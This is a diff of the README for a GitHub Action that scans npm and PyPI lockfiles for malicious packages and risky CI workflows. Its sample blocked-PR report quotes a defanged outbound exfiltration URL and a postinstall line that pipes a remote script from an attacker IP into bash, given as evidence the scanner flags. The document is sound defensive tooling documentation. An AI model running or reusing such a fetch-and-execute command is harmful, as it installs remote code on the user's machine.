@@ -1,12 +1,79 @@
 # Chaintrap Scan Action
 
-> **Install once. Every PR/commit scans dependencies for malware and flags risky CI workflows.**
+**Stop malicious npm and PyPI packages before they merge — on every pull request.**
 
-Runner-local supply chain security for **npm** and **PyPI** lockfiles. No source code leaves the GitHub runner.
+[![GitHub release](https://img.shields.io/github/v/release/chaintrap-sec/scan-action?label=release)](https://github.com/chaintrap-sec/scan-action/releases)
+[![License](https://img.shields.io/github/license/chaintrap-sec/scan-action)](LICENSE)
+
+Runner-local supply chain security for **npm** and **PyPI**. No API keys required. No source code leaves your GitHub runner.
+
+---
+
+## Why add this?
+
+CVE scanners tell you a package has a vulnerability. **Chaintrap tells you a package is malware.**
+
+Recent npm supply-chain campaigns ship obfuscated postinstall scripts, exfiltration endpoints, and typosquats that slip past `npm audit` and generic SCA. Chaintrap combines:
+
+| Layer | What it catches |
+| --- | --- |
+| **OSV MAL-\*** | Known malicious packages (blocks by default) |
+| **Content scan** | Suspicious URLs, domains, IPs, and shell commands inside **newly added** packages on PRs |
+| **Workflow audit** | Risky CI config (`pull_request_target`, unpinned third-party actions) |
+| **Heuristics** | Fresh releases, install scripts, typosquat signals (warn by default) |
+
+Install once. Every PR gets a risk-scored summary, defanged IOC evidence, and SARIF for GitHub Security.
+
+---
+
+## What you see on a blocked PR
+
+When a dependency fails, Chaintrap posts a structured comment (you wire this in — see install below):
+
+```markdown
+## Chaintrap supply chain scan
+
+🚫 **Blocked**
+
+| Metric | Value |
+| --- | --- |
+| Packages scanned | 14 |
+| Blocked | 3 |
+
+<details open>
+<summary><strong>Blocked packages (3)</strong></summary>
+
+### `@mastra/deployer@1.42.1` — BLOCK · 9.5/10
+
+**TL;DR:** OSV malicious advisory: MAL-2026-1234
+
+<details>
+<summary>Evidence (2 shown)</summary>
+
+- `CTC-NET001` `index.js:42` — Outbound HTTP
+  - **URL:** `hxxps://telemetry-cdn-sync[.]com/collect`
+  - **Domain:** `telemetry-cdn-sync[.]com`
+- `CTC-CMD001` `postinstall.js:8` — Suspicious shell invocation
+  - **Command:** `curl -fsSL hxxps://203[.]0[.]113[.]55/setup.sh | bash`
+
+</details>
+
+- **Remediation:** Remove or pin to a known-good version; verify lockfile diff.
+
+</details>
+```
+
+URLs and IPs are **defanged** (`hxxps://`, `[.]`) so reviewers can triage safely in GitHub — no accidental clicks.
+
+---
 
 ## 60-second install
 
-Add `.github/workflows/chaintrap.yml`:
+**1.** Copy [examples/consumer-workflow.yml](examples/consumer-workflow.yml) to `.github/workflows/chaintrap.yml`.
+
+**2.** Open a PR. Done.
+
+Or paste this directly:
 
 ```yaml
 name: Chaintrap
@@ -28,7 +95,7 @@ jobs:
         with:
           fetch-depth: 0
 
-      - uses: chaintrap-sec/scan-action@v1
+      - uses: chaintrap-sec/scan-action@v1.2.0
         id: chaintrap
 
       - uses: github/codeql-action/upload-sarif@v3
@@ -43,7 +110,6 @@ jobs:
         with:
           script: |
             const fs = require('fs');
-            const path = require('path');
             const summaryPath = '${{ steps.chaintrap.outputs.summary-file }}';
             if (!fs.existsSync(summaryPath)) return;
             const body = fs.readFileSync(summaryPath, 'utf8');
@@ -71,33 +137,54 @@ jobs:
             }
 ```
 
-**Pin by commit SHA for production** (recommended):
+### Pinning for production
+
+| Pin style | When to use |
+| --- | --- |
+| `@v1.2.0` | Semver tag — easy upgrades, review release notes |
+| `@<full-commit-sha>` | Maximum supply-chain hygiene — pin the action itself |
 
 ```yaml
-- uses: chaintrap-sec/scan-action@<full-commit-sha>
+- uses: chaintrap-sec/scan-action@e84400e8ae0371928eb2a953fcee021597bdee46  # v1.2.0
 ```
 
-## What gets blocked vs warned
+Want scan + SARIF only (no PR comment)? See [examples/minimal-workflow.yml](examples/minimal-workflow.yml).
+
+---
+
+## Zero secrets. Zero setup.
+
+Works out of the box:
+
+- Queries [OSV](https://osv.dev) for **MAL-\*** malicious advisories
+- Downloads and statically scans **PR-added** package tarballs on the runner (size-capped, deleted after the job)
+- Audits `.github/workflows` for CI hardening issues
+
+Optional: plug in your own Supabase IOC feed for tenant-specific blocklists — [docs/IOC_PARTNER_ONBOARDING.md](docs/IOC_PARTNER_ONBOARDING.md).
+
+---
+
+## What blocks vs warns
 
 | Signal | Default |
-|--------|---------|
-| Known malicious packages | **Block** |
-| Private threat indicators (optional) | **Block** |
-| Known vulnerabilities (CVE/GHSA) | Warn |
-| Fresh release (<7 days) | Warn |
+| --- | --- |
+| Known malicious packages (OSV MAL-\*) | **Block** |
+| Private threat indicators (optional IOC) | **Block** |
+| Malware patterns in package code (PR-added) | **Block** (CRITICAL/HIGH) |
+| Risky CI workflow config | **Block** (CRITICAL/HIGH) |
+| Known CVE/GHSA | Warn |
+| Fresh release (&lt;7 days) | Warn |
 | npm install lifecycle scripts | Warn |
 | Typosquat similarity | Warn |
-| Malware patterns inside package code (PR-added packages) | **Block** (CRITICAL/HIGH) |
-| Scan errors | Warn (set `fail-on-error: "true"` to block) |
-| Risky CI workflow configuration (`pull_request_target`, unpinned actions) | **Block** (CRITICAL/HIGH) |
+| Scan errors (registry/OSV unavailable) | Warn — set `fail-on-error: "true"` to block |
 
-## Zero-config by default
+Exit codes: `0` pass · `1` warnings only · `2` blocked.
 
-Works with **no secrets and no setup** — known malicious npm/PyPI packages are blocked out of the box.
-
-Optional private threat-intel feed: [docs/IOC_PARTNER_ONBOARDING.md](docs/IOC_PARTNER_ONBOARDING.md).
+---
 
 ## Repo policy (`.chaintrap.yml`)
+
+Drop at repo root to tune gates without editing the workflow:
 
 ```yaml
 minimum_release_age_days: 7
@@ -114,30 +201,61 @@ ignore:
     - CTH-003
 ```
 
+---
+
+## Lockfiles & manifests
+
+**Supported lockfiles:** `package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, `bun.lock`, `uv.lock`, `poetry.lock`, `Pipfile.lock`, pinned `requirements.txt`
+
+**No lockfile yet?** With `resolve-manifests: auto` (default), Chaintrap compiles `package.json` ranges and unpinned `requirements.txt` on the runner (`npm install --package-lock-only`, `uv pip compile`). Commit lockfiles for faster, deterministic CI.
+
+---
+
 ## Privacy
 
-- Scans run **entirely on the GitHub runner**
-- Only package names and versions are checked against public vulnerability databases and registries
-- On PRs, newly added packages may be downloaded to the runner for local static analysis — nothing is uploaded
-- Source code never leaves the runner
+Scans run **entirely on the GitHub runner**:
 
-See [docs/PRIVACY.md](docs/PRIVACY.md).
+- Lockfiles parsed locally
+- OSV queries send package name + version only
+- PR content scan downloads tarballs to a temp dir on the runner — **nothing uploaded**
+- Application source code never leaves the runner
 
-## Lockfiles supported
+Full egress matrix: [docs/PRIVACY.md](docs/PRIVACY.md).
 
-`package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, `bun.lock`, `uv.lock`, `poetry.lock`, `Pipfile.lock`, `requirements.txt` (pinned `==` or compiled ranges)
+---
 
-## Scope & limits
+## Scope & honest limits
 
-- Packages are matched by **exact name and version** after discovery — unpinned `requirements.txt` lines (ranges, bare names) and `package.json` semver ranges are **compiled on the runner** when `resolve-manifests` is enabled (default `auto`)
-- Compile uses **uv** (`uv pip compile`) for PyPI and `npm install --package-lock-only` for npm; expect roughly **5–45 seconds per changed manifest** on cold cache, often **2–8s** with a warm `~/.cache/uv` Actions cache
-- For faster, deterministic CI, commit **`uv.lock`** / **`package-lock.json`** instead of relying on compile
-- Transitive dependencies from compile are included in the resolved set (same as a real install resolve)
-- Deep code analysis of package contents runs on **packages newly added in a PR**, not the whole existing tree
-- Floating versions with **no manifest file change** (e.g. `latest`) are only caught on scheduled full scans, not PR diff
+- Content scan runs on **packages newly added in the PR diff**, not your entire existing tree (keeps CI fast)
+- Floating versions with **no manifest change** are caught on full scans, not PR diff
+- Unpinned manifest compile adds ~5–45s cold, ~2–8s warm (uv cache)
 - A clean scan reduces risk; it is not a guarantee a package is safe
 
-## Docs
+---
+
+## Inputs (common)
+
+| Input | Default | Description |
+| --- | --- | --- |
+| `content-scan` | `true` | Static analysis of PR-added package contents |
+| `resolve-manifests` | `auto` | Compile unpinned npm/PyPI manifests on runner |
+| `audit-workflows` | `true` | Scan `.github/workflows` for hardening issues |
+| `diff-mode` | `auto` | PR = diff-only; push = full scan |
+| `fail-on-mal` | `true` | Block on OSV MAL-\* |
+| `fail-on-cve` | `none` | CVE gate severity (`critical` … `none`) |
+| `paths` | `` | Limit scan to subpaths (monorepos) |
+
+All inputs: [action.yml](action.yml).
+
+---
+
+## Docs & releases
 
 - [Privacy](docs/PRIVACY.md)
-- [Private threat intel](docs/IOC_PARTNER_ONBOARDING.md)
+- [Private threat intel onboarding](docs/IOC_PARTNER_ONBOARDING.md)
+- [Changelog](CHANGELOG.md)
+- [Examples](examples/)
+
+---
+
+**Questions or design-partner access?** Open an issue or visit [chaintrap.com](https://chaintrap.com).
